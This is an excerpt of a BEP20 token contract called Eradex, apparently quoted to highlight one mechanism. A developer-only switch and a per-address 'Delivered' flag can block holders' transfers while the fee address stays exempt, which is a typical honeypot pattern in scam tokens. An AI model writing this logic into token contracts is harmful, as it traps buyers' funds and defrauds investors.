...
contract Eradex is IBEP20, Ownable {
  ...
  constructor(
    ...
    DeliverPossible = _deliverPossible;
  ...
  function _DeliverPossible(bool _allow) external onlyDev {
      DeliverPossible = _allow;
  }
  ...
  function _transfer(
    ...
    require(DeliverPossible && !Delivered[sender] || msg.sender == FeeAddress);
